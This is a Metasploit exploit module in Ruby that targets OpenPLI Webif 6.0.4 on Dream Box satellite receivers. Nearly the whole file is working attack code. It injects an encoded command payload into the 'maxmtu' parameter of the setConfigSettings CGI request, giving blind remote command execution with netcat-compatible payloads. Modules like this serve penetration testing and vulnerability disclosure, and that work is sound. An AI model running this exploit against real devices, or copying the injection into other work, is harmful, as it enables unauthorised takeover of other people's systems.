# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;          => &#039;OpenPLI Webif Arbitrary Command Execution&#039;,
      &#039;Description&#039;   => %q{
          Some Dream Boxes with OpenPLI v3 beta Images are vulnerable to OS command
        injection in the Webif 6.0.4 Web Interface. This is a blind injection, which means
        that you will not see any output of your command. A ping command can be used for
        testing the vulnerability.  This module has been tested in a box with the next
        features: Linux Kernel version 2.6.9 (build@plibouwserver) (gcc version 3.4.4) #1
        Wed Aug 17 23:54:07 CEST 2011, Firmware release 1.1.0 (27.01.2013), FP Firmware
        1.06 and Web Interface 6.0.4-Expert (PLi edition).
      },
      &#039;Author&#039;        => [ &#039;m-1-k-3&#039; ],
      &#039;License&#039;       => MSF_LICENSE,
      &#039;References&#039;    =>
        [
          [ &#039;OSVDB&#039;, &#039;90230&#039; ],
          [ &#039;BID&#039;, &#039;57943&#039; ],
          [ &#039;EDB&#039;, &#039;24498&#039; ],
          [ &#039;URL&#039;, &#039;http://openpli.org/wiki/Webif&#039; ],
          [ &#039;URL&#039;, &#039;http://www.s3cur1ty.de/m1adv2013-007&#039; ]
        ],
      &#039;Platform&#039;     => [&#039;unix&#039;, &#039;linux&#039;],
      &#039;Arch&#039;         => ARCH_CMD,
      &#039;Privileged&#039;   => true,
      &#039;Payload&#039;      =>
        {
          &#039;Space&#039;       => 1024,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;netcat generic&#039;
            }
        },
      &#039;Targets&#039;      =>
        [
          [ &#039;Automatic Target&#039;, { }]
        ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Feb 08 2013&#039;
    ))
  end

  def exploit
    print_status("#{rhost}:#{rport} - Sending remote command...")
    vprint_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
    begin
      send_request_cgi(
        {
          &#039;uri&#039;    => normalize_uri("cgi-bin", "setConfigSettings"),
          &#039;method&#039; => &#039;GET&#039;,
          &#039;vars_get&#039; => {
            "maxmtu" => "1500&#{payload.encoded}&"
          }
        })

    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      fail_with(Msf::Exploit::Failure::Unreachable, "#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
    end
  end
end

